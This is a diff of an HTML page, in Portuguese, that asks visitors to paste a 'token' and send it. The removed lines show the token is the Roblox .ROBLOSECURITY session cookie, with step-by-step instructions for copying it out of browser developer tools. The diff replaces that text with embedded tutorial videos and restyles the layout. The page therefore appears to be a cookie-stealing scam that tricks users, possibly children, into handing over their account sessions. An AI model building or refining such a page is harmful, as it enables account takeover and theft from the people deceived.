@@ -25,12 +25,32 @@
       background: #000;
       position: relative;
       flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 10px;
     }
-    .video-sidebar iframe {
-      position: absolute;
-      top: 0; left: 0;
+    .video-wrapper {
+      width: 100%;
+      max-width: 380px; /* limita largura máxima pra ficar menor */
+      aspect-ratio: 16 / 9;
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 15px rgba(255, 0, 68, 0.4);
+    }
+    .video-wrapper iframe {
       width: 100%;
       height: 100%;
+      border: none;
+    }
+    .video-label {
+      margin-top: 12px;
+      font-size: 1.3em;
+      color: #ff88aa;
+      text-shadow: 0 0 8px #ff0044;
+      font-weight: bold;
+      text-align: center;
     }
     #main-content {
       flex: 1;
@@ -88,25 +108,6 @@
     .glow {
       text-shadow: 0 0 20px #ff0044, 0 0 40px #cc0033;
     }
-    .tutorial {
-      background: rgba(20, 0, 40, 0.6);
-      border: 1px solid #660033;
-      border-radius: 10px;
-      padding: 20px;
-      margin-top: 30px;
-      max-width: 500px;
-      text-align: left;
-      font-size: 1.1em;
-      line-height: 1.5;
-    }
-    .tutorial h3 {
-      color: #ff88aa;
-      margin-top: 0;
-    }
-    .tutorial ul {
-      padding-left: 20px;
-      margin: 10px 0;
-    }
 
     /* Loading screen */
     #loading {
@@ -140,15 +141,18 @@
       min-height: 80px;
     }
 
-    /* Responsivo */
+    /* Responsivo para mobile */
     @media (max-width: 900px) {
       .container {
         flex-direction: column;
       }
       .video-sidebar {
         width: 100%;
-        height: 35vh;
-        min-height: 200px;
+        padding: 15px 10px;
+      }
+      .video-wrapper {
+        max-width: 90%;
+        height: 180px; /* mais pequeno no mobile */
       }
       #main-content {
         padding: 40px 20px;
@@ -156,35 +160,24 @@
       #video-right {
         order: 2;
       }
-      #tutorial-pc {
-        display: none; /* esconde tutorial PC no mobile */
-      }
-      #tutorial-mobile {
-        display: block; /* mostra tutorial mobile */
-      }
-    }
-    @media (min-width: 901px) {
-      #tutorial-mobile {
-        display: none; /* esconde mobile no PC */
-      }
-      #tutorial-pc {
-        display: block;
-      }
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <!-- Vídeo à esquerda -->
+    <!-- Vídeo esquerdo + label "Tutorial pra PC" -->
     <div class="video-sidebar" id="video-left">
-      <iframe 
-        src="https://www.youtube.com/embed/FHjCtdGNHCU?rel=0&modestbranding=1&showinfo=0" 
-        title="YouTube video 1" 
-        frameborder="0" 
-        allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-        allowfullscreen>
-      </iframe>
+      <div class="video-wrapper">
+        <iframe 
+          src="https://www.youtube.com/embed/FHjCtdGNHCU?rel=0&modestbranding=1&showinfo=0" 
+          title="Tutorial PC" 
+          frameborder="0" 
+          allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+          allowfullscreen>
+        </iframe>
+      </div>
+      <div class="video-label">Tutorial pra PC</div>
     </div>
 
     <!-- Conteúdo principal -->
@@ -197,44 +190,20 @@
       <button id="sendBtn" onclick="enviar()">Enviar token</button>
 
       <div id="status"></div>
-
-      <!-- Tutorial para PC (aparece só em desktop) -->
-      <div id="tutorial-pc" class="tutorial">
-        <h3>Tutorial para PC (Chrome/Edge):</h3>
-        <ul>
-          <li>Abra o Roblox no navegador (www.roblox.com) e faça login na sua conta.</li>
-          <li>Pressione F12 ou Ctrl + Shift + I para abrir as Ferramentas do Desenvolvedor.</li>
-          <li>Vá na aba "Application" (ou "Aplicativo") → "Cookies" → "https://www.roblox.com".</li>
-          <li>Procure o cookie chamado <strong>.ROBLOSECURITY</strong>.</li>
-          <li>Clique nele → Copie o valor completo (começa com _|WARNING:...).</li>
-          <li>Cole aqui no campo acima e clique em "Enviar token".</li>
-        </ul>
-      </div>
-
-      <!-- Tutorial para Mobile (aparece só em mobile) -->
-      <div id="tutorial-mobile" class="tutorial">
-        <h3>Tutorial para Celular (Android/iOS):</h3>
-        <ul>
-          <li>Abra o navegador (Chrome ou Safari) e entre no site www.roblox.com.</li>
-          <li>Faça login na sua conta Roblox.</li>
-          <li>Toque nos 3 pontinhos (menu) → "Configurações do site" ou "Ferramentas do desenvolvedor" (pode precisar ativar no menu do navegador).</li>
-          <li>Se não achar: use o PC ou peça ajuda a alguém com computador.</li>
-          <li>Alternativa: copie o token do app Roblox (vá em Configurações → Segurança → Cookies avançados se disponível).</li>
-          <li>Cole o token completo aqui e toque em "Enviar token".</li>
-        </ul>
-        <p style="color: #ff8888; font-size: 0.9em;">Dica: É mais fácil no computador, mas funciona no celular também!</p>
-      </div>
     </div>
 
-    <!-- Vídeo à direita -->
+    <!-- Vídeo direito + label "Tutorial pro Mobile" -->
     <div class="video-sidebar" id="video-right">
-      <iframe 
-        src="https://www.youtube.com/embed/nwHMDsXw8WE?rel=0&modestbranding=1&showinfo=0" 
-        title="YouTube video 2" 
-        frameborder="0" 
-        allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-        allowfullscreen>
-      </iframe>
+      <div class="video-wrapper">
+        <iframe 
+          src="https://www.youtube.com/embed/nwHMDsXw8WE?rel=0&modestbranding=1&showinfo=0" 
+          title="Tutorial Mobile" 
+          frameborder="0" 
+          allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+          allowfullscreen>
+        </iframe>
+      </div>
+      <div class="video-label">Tutorial pro Mobile</div>
     </div>
   </div>
 
